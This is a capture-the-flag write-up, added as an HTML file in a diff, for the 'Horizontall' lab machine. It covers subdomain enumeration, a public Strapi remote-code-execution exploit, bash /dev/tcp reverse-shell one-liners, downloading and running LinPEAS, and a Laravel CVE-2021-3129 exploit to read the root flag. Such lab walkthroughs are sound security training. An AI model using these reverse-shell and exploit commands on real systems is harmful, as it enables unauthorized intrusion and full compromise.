@@ -1,0 +1,251 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Horizontall</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+  <div class="page">
+    <h1 class="title">Horizontall</h1>
+
+    <section>
+      <h2>Initial Reconnaissance</h2>
+      <p>
+        I start by performing a full port scan against the target machine
+        to identify open services.
+      </p>
+
+      <div class="code-block">
+        <pre><code>nmap -Pn -sV -sC -p- --open 10.10.11.105 -oN scan.txt</code></pre>
+      </div>
+
+      <p>
+        The application presents some connectivity issues, so I add the
+        hostname to my <code>/etc/hosts</code> file.
+      </p>
+
+      <p>
+        At first glance, the website only contains a couple of buttons
+        and nothing particularly interesting.
+      </p>
+    </section>
+
+    <section>
+      <h2>Web Enumeration</h2>
+      <p>
+        I perform directory enumeration to check if any hidden endpoints
+        or login panels are exposed.
+      </p>
+
+      <div class="code-block">
+        <pre><code>dirb http://horizontall.htb/</code></pre>
+      </div>
+
+      <p>
+        Since directory enumeration does not reveal anything useful,
+        I proceed with virtual host enumeration.
+      </p>
+
+      <div class="code-block">
+        <pre><code>gobuster vhost -u http://horizontall.htb -t 35 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+--append-domain -k --no-error</code></pre>
+      </div>
+
+      <p>
+        The output contains too many false positives, so I switch to
+        <strong>ffuf</strong> for more accurate results.
+      </p>
+
+      <div class="code-block">
+        <pre><code>sudo ffuf -u http://horizontall.htb/ \
+-H "Host: FUZZ.horizontall.htb" \
+-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+-fs 194</code></pre>
+      </div>
+    </section>
+
+    <section>
+      <h2>Client-Side Analysis</h2>
+      <p>
+        Since no obvious attack vectors appear, I inspect the website
+        source code looking for hidden references or redirections.
+      </p>
+
+      <p>
+        The HTML itself does not reveal anything useful, so I analyze the
+        loaded JavaScript files instead.
+      </p>
+
+      <p>
+        After beautifying the JavaScript code, I discover a redirection
+        pointing to another subdomain.
+      </p>
+
+      <img src="images/23-1.png" alt="JavaScript redirection">
+
+      <p>
+        I add the newly discovered subdomain to <code>/etc/hosts</code>
+        and continue enumeration from there.
+      </p>
+    </section>
+
+    <section>
+      <h2>API Enumeration</h2>
+      <p>
+        I perform directory enumeration against the API endpoint.
+      </p>
+
+      <div class="code-block">
+        <pre><code>dirb http://api-prod.horizontall.htb/</code></pre>
+      </div>
+
+      <p>
+        Several interesting directories are discovered during this phase.
+      </p>
+
+      <img src="images/23-2.png" alt="API directories">
+
+      <p>
+        While <code>robots.txt</code> and <code>users</code> do not provide
+        anything relevant, accessing the <strong>admin</strong> endpoint
+        reveals a login page.
+      </p>
+
+      <p>
+        Default credentials do not work, so I intercept the login request
+        using Burp Suite to analyze the server response.
+      </p>
+
+      <p>
+        The response does not reveal anything useful, so I perform
+        directory enumeration inside the admin panel itself.
+      </p>
+
+      <p>
+        This leads me to the <strong>init</strong> directory, where I
+        identify the version of <strong>Strapi</strong> in use.
+      </p>
+    </section>
+
+    <section>
+      <h2>Remote Code Execution</h2>
+      <p>
+        Using <strong>searchsploit</strong>, I find a known
+        <strong>Remote Code Execution</strong> vulnerability affecting
+        this version of Strapi.
+      </p>
+
+      <img src="images/23-3.png" alt="Strapi RCE">
+
+      <div class="code-block">
+        <pre><code>python3 50239.py http://api-prod.horizontall.htb/</code></pre>
+      </div>
+
+      <p>
+        The exploit provides a blind shell, which I then use to obtain a
+        full reverse shell.
+      </p>
+
+      <div class="code-block">
+        <pre><code>bash -i >& /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0>&1</code></pre>
+      </div>
+
+      <p>
+        To avoid a <em>Bad Request</em> error, I execute the payload
+        through a bash wrapper.
+      </p>
+
+      <div class="code-block">
+        <pre><code>bash -c 'bash -i >& /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0>&1'</code></pre>
+      </div>
+
+      <img src="images/23-5.png" alt="Reverse shell">
+    </section>
+
+    <section>
+      <h2>User Access</h2>
+      <p>
+        With the reverse shell established, I locate and retrieve the
+        <code>user.txt</code> flag from the developer’s home directory.
+      </p>
+
+      <div class="code-block">
+        <pre><code>cat /home/developer/user.txt</code></pre>
+      </div>
+
+      <p>
+        Attempting to run <code>sudo -l</code> fails because it requires
+        the Strapi user password.
+      </p>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        I upload <strong>LinPEAS</strong> to the target system to identify
+        potential privilege escalation vectors.
+      </p>
+
+      <div class="code-block">
+        <pre><code>python3 -m http.server &lt;PORT&gt;</code></pre>
+      </div>
+
+      <div class="code-block">
+        <pre><code>wget http://&lt;IP&gt;:&lt;PORT&gt;/linpeas.sh</code></pre>
+      </div>
+
+      <div class="code-block">
+        <pre><code>chmod +x linpeas.sh
+./linpeas.sh > linpeas.txt</code></pre>
+      </div>
+
+      <p>
+        LinPEAS highlights several open local ports. Using
+        <code>netstat</code>, I confirm that a web service is running
+        locally.
+      </p>
+
+      <div class="code-block">
+        <pre><code>netstat -pentul</code></pre>
+      </div>
+
+      <img src="images/23-7.png" alt="Local services">
+    </section>
+
+    <section>
+      <h2>Local Service Exploitation</h2>
+      <p>
+        I send a request to the local service running on port 8000 and
+        discover a Laravel application.
+      </p>
+
+      <div class="code-block">
+        <pre><code>curl -sSL -D- http://localhost:8000 -o /dev/null</code></pre>
+      </div>
+
+      <p>
+        Since the service is only accessible locally, I set up SSH
+        port forwarding to access it from my own machine.
+      </p>
+
+      <p>
+        After analyzing the application, I identify a vulnerable version
+        of Laravel affected by <strong>CVE-2021-3129</strong>.
+      </p>
+
+      <p>
+        I execute a public exploit and confirm that I can run commands
+        as the root user.
+      </p>
+
+      <div class="code-block">
+        <pre><code>python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"</code></pre>
+      </div>
+    </section>
+  </div>
+</body>
+
+</html>
